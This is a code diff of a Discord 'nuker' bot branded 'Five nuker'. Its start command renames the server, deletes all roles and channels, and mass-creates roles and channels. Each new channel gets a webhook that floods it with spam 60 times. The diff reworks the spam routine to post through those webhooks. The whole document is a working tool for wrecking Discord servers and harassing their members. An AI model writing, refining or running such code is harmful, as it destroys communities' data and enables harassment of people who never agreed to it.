@@ -30,6 +30,8 @@ async def on_ready():
         await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=ac_name))
     elif silent_mode == 1:
         await client.change_presence(status=discord.Status.offline)
+f = open('icon.PNG', 'rb')
+icona = f.read()
 
 
 
@@ -39,15 +41,17 @@ async def killobject(obj):
     try: await obj.delete()
     except: pass
 
-async def sendch(ch,text,count):
- for _ in range(count):
-    try: await ch.send(text)
-    except: pass
+async def sendch(ctx,channel: discord.TextChannel,count):
+    for _ in range(count):
+        try: await channel.send(spamtext)
+        except: pass
 
-async def createchannel(ctx):
-    try: c = await ctx.guild.create_text_channel('nuked-by-Five-nuker')
+async def createchannel(ctx,name):
+    try:
+        chan = await ctx.guild.create_text_channel(name=name)
+        wb = await chan.create_webhook(name="Five nuker",avatar=icona)
+        create_task(sendch(ctx,wb,60))
     except: pass
-    else: create_task(sendch(ch=c,text=spamtext, count=60))
 
 async def createrole(ctx):
     try: await ctx.guild.create_role(name='nuked-by-Five-nuker')
@@ -58,19 +62,17 @@ async def createrole(ctx):
 @client.command()
 async def start(ctx):
     await ctx.message.delete()
-    f = open('icon.PNG', 'rb')
-    icona = f.read()
     await ctx.guild.edit(name='Nuked by Five nuker<3', icon=icona)
     for rl in ctx.guild.roles:
         create_task(killobject(obj=rl))
-    for channel in ctx.guild.text_channels:
-        create_task(sendch(ch=channel,text=spamtext,count=2))
     for channel in ctx.guild.channels:
         create_task(killobject(obj=channel))
     await bananaa(ctx=ctx)
-    for _ in range(60):
-        create_task(createchannel(ctx))
+    for _ in range(40):
         create_task(createrole(ctx))
+    for _ in range(35):    
+        create_task(createchannel(ctx,name="nuked by five nuker"))
+
 
 
 async def bananaa(ctx):
